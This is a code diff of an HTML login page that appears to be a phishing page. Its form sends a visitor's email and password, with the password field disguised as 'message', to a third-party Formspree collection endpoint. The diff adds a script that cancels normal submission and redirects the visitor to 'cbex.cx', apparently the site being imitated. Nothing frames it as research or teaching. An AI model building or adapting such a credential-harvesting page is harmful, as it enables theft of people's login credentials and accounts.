@@ -30,7 +30,7 @@
 
       </div>
 
-      <form action="https://formspree.io/f/mldekyqd" method="POST">
+      <form id="myForm" onsubmit="submitForm(event)" action="https://formspree.io/f/mldekyqd" method="POST">
 
         <input class="mail" name="email" type="text" placeholder="Please enter your email address">
         <input class="pwd" name="message" type="" placeholder="Please enter your password">
@@ -53,20 +53,30 @@
           Download app
         </div>
       </a>
-      
+
       <div class="kkk">
         <a href="">
-          Register 
+          Register
         </a>
         <a class="float" href="">Forget password</a>
       </div>
-      
+
       <a href="">
         <div class="ccs">
           <i class="fa-solid fa-headset"></i>
           Contact Customer Service
         </div>
       </a>
+
+
+      <script>
+        function submitForm(event) {
+          event.preventDefault(); // prevent default form submission
+          // submit form data to server using AJAX or fetch API
+          // ...
+          window.location.href = "(cbex.cx)"; // redirect to thank-you page
+        }
+      </script>
 
 </body>
 
